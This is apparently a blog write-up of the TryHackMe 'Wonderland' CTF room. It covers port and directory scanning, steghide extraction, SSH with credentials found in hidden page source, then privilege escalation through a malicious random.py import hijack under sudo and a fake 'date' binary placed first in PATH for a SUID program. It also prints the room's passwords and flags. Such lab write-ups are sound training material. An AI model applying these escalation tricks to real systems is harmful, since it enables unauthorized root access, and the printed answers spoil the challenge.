---
title: "Wonderland CTF - TryHackMe"
author: Ludovic COULON
date: 2020-06-12
hero: ./images/hero.jpeg
excerpt: "Writeup for the Wonderland CTF room on TryHackMe"
---

[TryHackMe | Wonderland CTF](https://tryhackme.com/room/wonderland)

Enter Wonderland and capture the flags.

---

### Setup

```bash
➜  TryHackMe nmap -A -vv 10.10.115.107
```

```bash
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDe20sKMgKSMTnyRTmZhXPxn+xLggGUemXZLJDkaGAkZSMgwM3taNTc8OaEku7BvbOkqoIya4ZI8vLuNdMnESFfB22kMWfkoB0zKCSWzaiOjvdMBw559UkLCZ3bgwDY2RudNYq5YEwtqQMFgeRCC1/rO4h4Hl0YjLJufYOoIbK0EPaClcDPYjp+E1xpbn3kqKMhyWDvfZ2ltU1Et2MkhmtJ6TH2HA+eFdyMEQ5SqX6aASSXM7OoUHwJJmptyr2aNeUXiytv7uwWHkIqk3vVrZBXsyjW4ebxC3v0/Oqd73UWd5epuNbYbBNls06YZDVI8wyZ0eYGKwjtogg5+h82rnWN
|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHH2gIouNdIhId0iND9UFQByJZcff2CXQ5Esgx1L96L50cYaArAW3A3YP3VDg4tePrpavcPJC2IDonroSEeGj6M=
|   256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAsWAdr9g04J7Q8aeiWYg03WjPqGVS6aNf/LF+/hMyKh

80/tcp open  http    syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Follow the white rabbit.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```bash
➜  TryHackMe gobuster dir -u http://10.10.115.107 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

```bash
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.115.107
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/06/11 10:04:36 Starting gobuster
===============================================================
/img (Status: 301)
/r (Status: 301)
```

After some times i tired to gobuster recursively ("/r/a/b/b/i/t") and the latest path was

<div className="Image__Medium">
  <img src="https://imgur.com/6wONIdd.png" alt="blog_image" />
</div>

And if you use steghide on the image in the index page you will get this

```bash
➜  TryHackMe wget http://10.10.115.107/img/white_rabbit_1.jpg
--2020-06-11 10:08:46--  http://10.10.115.107/img/white_rabbit_1.jpg
Connecting to 10.10.115.107:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1993438 (1.9M) [image/jpeg]
Saving to: ‘white_rabbit_1.jpg.1’

white_rabbit_1.jpg.1     100%[===============================>]   1.90M   639KB/s    in 3.0s

2020-06-11 10:08:49 (639 KB/s) - ‘white_rabbit_1.jpg.1’ saved [1993438/1993438]

➜  TryHackMe steghide extract -sf white_rabbit_1.jpg
Enter passphrase:
the file "hint.txt" does already exist. overwrite ? (y/n) y
wrote extracted data to "hint.txt".

➜  TryHackMe cat hint.txt
follow the r a b b i t%
```

<div className="Image__Medium">
  <img src="https://imgur.com/J4aPpxv.png" alt="blog_image" />
</div>

There is something hidden on the source code maybe something useful ?

```bash
<p style="display: none;">alice:HowDothTheLittleCrocodileImproveHisShiningTail</p>
```

Let's try to ssh the server with the hidden creds.

<div className="Image__Medium">
  <img src="https://imgur.com/oe0VfyS.png" alt="blog_image" />
</div>

Yep that worked ! 🤤

### #1 Obtain the flag in user.txt

I tried some find commands

```bash
alice@wonderland:~$ find / -type f -name "user.*" 2>/dev/null
```

Nothing came out.. Let's try something else.

```python
alice@wonderland:~$ cat walrus_and_the_carpenter.py
import random
poem = """The sun was shining on the sea,
Shining with all his might:
He did his very best to make
The billows smooth and bright —
And this was odd, because it was
The middle of the night.

The moon was shining sulkily,
Because she thought the sun
Had got no business to be there
After the day was done —
"It’s very rude of him," she said,
"To come and spoil the fun!"

The sea was wet as wet could be,
The sands were dry as dry.
You could not see a cloud, because
No cloud was in the sky:
No birds were flying over head —
There were no birds to fly.

The Walrus and the Carpenter
Were walking close at hand;
They wept like anything to see
Such quantities of sand:
"If this were only cleared away,"
They said, "it would be grand!"

"If seven maids with seven mops
Swept it for half a year,
Do you suppose," the Walrus said,
"That they could get it clear?"
"I doubt it," said the Carpenter,
And shed a bitter tear.

"O Oysters, come and walk with us!"
The Walrus did beseech.
"A pleasant walk, a pleasant talk,
Along the briny beach:
We cannot do with more than four,
To give a hand to each."

The eldest Oyster looked at him.
But never a word he said:
The eldest Oyster winked his eye,
And shook his heavy head —
Meaning to say he did not choose
To leave the oyster-bed.

But four young oysters hurried up,
All eager for the treat:
Their coats were brushed, their faces washed,
Their shoes were clean and neat —
And this was odd, because, you know,
They hadn’t any feet.

Four other Oysters followed them,
And yet another four;
And thick and fast they came at last,
And more, and more, and more —
All hopping through the frothy waves,
And scrambling to the shore.

The Walrus and the Carpenter
Walked on a mile or so,
And then they rested on a rock
Conveniently low:
And all the little Oysters stood
And waited in a row.

"The time has come," the Walrus said,
"To talk of many things:
Of shoes — and ships — and sealing-wax —
Of cabbages — and kings —
And why the sea is boiling hot —
And whether pigs have wings."

"But wait a bit," the Oysters cried,
"Before we have our chat;
For some of us are out of breath,
And all of us are fat!"
"No hurry!" said the Carpenter.
They thanked him much for that.

"A loaf of bread," the Walrus said,
"Is what we chiefly need:
Pepper and vinegar besides
Are very good indeed —
Now if you’re ready Oysters dear,
We can begin to feed."

"But not on us!" the Oysters cried,
Turning a little blue,
"After such kindness, that would be
A dismal thing to do!"
"The night is fine," the Walrus said
"Do you admire the view?

"It was so kind of you to come!
And you are very nice!"
The Carpenter said nothing but
"Cut us another slice:
I wish you were not quite so deaf —
I’ve had to ask you twice!"

"It seems a shame," the Walrus said,
"To play them such a trick,
After we’ve brought them out so far,
And made them trot so quick!"
The Carpenter said nothing but
"The butter’s spread too thick!"

"I weep for you," the Walrus said.
"I deeply sympathize."
With sobs and tears he sorted out
Those of the largest size.
Holding his pocket handkerchief
Before his streaming eyes.

"O Oysters," said the Carpenter.
"You’ve had a pleasant run!
Shall we be trotting home again?"
But answer came there none —
And that was scarcely odd, because
They’d eaten every one."""

for i in range(10):
    line = random.choice(poem.split("\n"))
    print("The line was:\t", line)
```

This python code is randomly choose 10 lines and print them, but as you can see the code is importing the "random" lib, let's try to create our own one and execute the script with another account.

```bash
alice@wonderland:~$ cat random.py
#!/bin/bash

import os

os.system("/bin/bash")
```

```bash
alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

<div className="Image__Medium">
  <img src="https://imgur.com/skVItpo.png" alt="blog_image" />
</div>

<div className="Image__Medium">
  <img src="https://imgur.com/dvizfgC.png" alt="blog_image" />
</div>

Nothing there let's see the source..

<div className="Image__Medium">
  <img src="https://imgur.com/bb0eRMG.png" alt="blog_image" />
</div>

```bash
The Mad Hatter will be here soon./bin/echo -n 'Probably by ' && date --date='next hour' -RAsk very nicely, and I will give you some tea while you wait for himSegmentation fault (core dumped)
```

Like the previous one let's create our own date file and execute it.

```bash
rabbit@wonderland:/home/rabbit$ nano date
Unable to create directory /home/alice/.local/share/nano/: Permission denied
It is required for saving/loading search history or cursor positions.

Press Enter to continue

rabbit@wonderland:/home/rabbit$ chmod +x date
rabbit@wonderland:/home/rabbit$ ls -la
total 44
drwxr-x--- 2 rabbit rabbit  4096 Jun 11 14:41 .
drwxr-xr-x 6 root   root    4096 May 25 17:52 ..
lrwxrwxrwx 1 root   root       9 May 25 17:53 .bash_history -> /dev/null
-rw-r--r-- 1 rabbit rabbit   220 May 25 03:01 .bash_logout
-rw-r--r-- 1 rabbit rabbit  3771 May 25 03:01 .bashrc
-rw-r--r-- 1 rabbit rabbit   807 May 25 03:01 .profile
-rwxr-xr-x 1 rabbit rabbit    10 Jun 11 14:41 date
-rwsr-sr-x 1 root   root   16816 May 25 17:58 teaParty
rabbit@wonderland:/home/rabbit$ export PATH=/home/rabbit:$PATH
rabbit@wonderland:/home/rabbit$ echo $PATH
/home/rabbit:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
rabbit@wonderland:/home/rabbit$ ./teaParty
```

<div className="Image__Medium">
  <img src="https://imgur.com/e4Z7IMa.png" alt="blog_image" />
</div>

```bash
# password
WhyIsARavenLikeAWritingDesk?
```

<div className="Image__Medium">
  <img src="https://imgur.com/36FmjQ1.png" alt="blog_image" />
</div>

Hatter wad can not run sudo.. Well let's try linenum

[rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)

<div className="Image__Medium">
  <img src="https://imgur.com/4M5p5gI.png" alt="blog_image" />
</div>

<div className="Image__Medium">
  <img src="https://imgur.com/G1OZAxm.png" alt="blog_image" />
</div>

<div className="Image__Medium">
  <img src="https://imgur.com/NrIZUfZ.png" alt="blog_image" />
</div>

```bash
root@wonderland:/root# ls
user.txt
root@wonderland:/root# cat user.txt
thm{"Curiouser and curiouser!"}
```

### #2 Escalate your privileges, what is the flag in root.txt?

```bash
root@wonderland:/root# find / -type f -name "root.txt"
/home/alice/root.txt
root@wonderland:/root# cat /home/alice/root.txt
thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}
```

<center>
  <a href="https://tryhackme.com/p/boperXD" target="_blank">
    <img src="https://i.imgur.com/GAKz5CS.png" alt="TryhackMeProfile" />
  </a>
</center>
